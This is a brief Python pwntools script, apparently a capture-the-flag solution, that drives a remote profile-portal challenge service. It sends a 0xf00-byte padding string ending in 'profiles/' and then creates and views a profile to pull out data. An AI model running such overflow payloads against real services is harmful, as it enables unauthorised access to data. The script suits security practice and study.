from pwn import *

r = remote("challenges.ctfd.io", 30481)

def create_personal(name, state, gender, age, ad):
    r.sendlineafter("cmd>", "CREATE_PROFILE personal")
    r.sendlineafter(">", name)
    r.sendlineafter(">", state)
    r.sendlineafter(">", gender)
    r.sendlineafter(">", str(age))
    r.sendlineafter(">", ad)
    r.recvuntil('profile_id:')
    return int(r.recvuntil(')')[:-1])

def edit_ad_profile(id, newad):
    r.sendlineafter("cmd>", "EDIT_PROFILE " + str(id))
    r.sendlineafter(">", newad)

def post_profile(id, post):
    r.sendlineafter("cmd>", "POST " + str(id))
    r.sendlineafter(">", post)

def view_profile(id):
    r.sendlineafter("cmd>", "VIEW_PROFILE " + str(id))
    return r.recvuntil('Portal Options')




post_profile(2618, "A"*0xf00 + "profiles/")
edit_ad_profile(2618, "friendzone_ceo")
profile1 = create_personal("abc", "def", "xyz", 42, "friendzone_ceo")
print(view_profile(profile1))

